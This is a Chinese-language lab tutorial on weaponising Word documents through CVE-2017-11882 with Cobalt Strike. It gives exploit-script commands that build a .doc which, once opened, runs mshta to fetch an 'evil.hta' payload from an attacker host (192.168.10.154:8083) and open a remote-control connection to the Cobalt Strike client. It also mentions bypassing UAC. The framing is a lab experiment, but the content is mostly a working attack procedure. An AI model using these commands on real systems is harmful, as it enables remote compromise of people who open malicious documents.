##### **Cobalt strike介绍**

Cobalt Strike是一款美国 Red Team 开发的渗透测试神器，常被业界人称为CS

项目地址：https://www.cobaltstrike.com

Cobalt strike分为 客户端 (Client) 与 服务端 (Teamserver)，服务端为一个，客户端可以有多个，团队可进行分布 式协团操作。

**mshta概念：**

mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。

注意：cmd.exe需要以管理员身份运行，在实际攻击中，需要bypass uac

##### **实验：CVE-2017-11882与CS远控hta结合**

CVE-2017-11882属于缓冲区溢出类型漏洞，产生漏洞原因于EQNEDT32.EXE（微软office自带公式编辑器）进程在读入包含MathType的ole数据时，在拷贝公式字体名称（Font Name数据）时没有对名称长度进行校验，导致缓冲区溢出。通过覆盖函数的返回地址，可执行任意代码。

 

漏洞验证POC脚本：Command\_CVE-2017-11882.py

漏洞攻击EXP脚本：webdav\_exec\_CVE-2017-11882.py

![](../Images/23330fe358170825738ea6a983196405.png)

****1、POC验证****

①POC生成word文件，让目标机执行，验证漏洞

python Command\_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc

\-c执行命令；cmd.exe /c 执行cmd命令 ；计算器；-o 当前目录生成doc文件

![](../Images/29e9144dcc4646cb54a2d4b089dc015e.png)

②目标机打开木马doc文件，触发calc.exe

![](../Images/0b5d01317b8a8b87ed43053443cce99e.png)

③拓展：宏模块，word可执行任意代码的地方

![](../Images/44bcb0aed7e96daae5582b384b6d8e7b.png)

   

****2、EXP利用****

原理：使用exp脚本加载CS生成的evil.hta木马，注入到word文档中，只要一打开doc，就会执行

①生成exp的word

命令一：python webdav\_exec\_CVE-2017-11882.py -u "mshta http://192.168.10.154:8083/evil.hta" -e "mshta http://192.168.10.154:8083/evil.hta" -o exps.doc

![](../Images/b223d5ba252a1cc8e98ad647612cd4a2.png)

命令二：python webdav\_exec\_CVE-2017-11882.py -u "mshta http://192.168.10.154:8083/evil.hta" -e "mshta" -o exp.doc

![](../Images/43035c2dc02f4f94da27cc40694704e1.png)

  

②目标机运行exp文件，打开就行

![](../Images/3c5e7c7a7e5cf5320c116e9917626b54.png)

  

  

③CS客户端接收木马反连

![](../Images/cc4c509d902c4bd63d9a87d45b17b4bb.png)

  

参数：-u 含有木马evil.hta的网页，-e 在木马网页要执行的命令，-o 输出文件
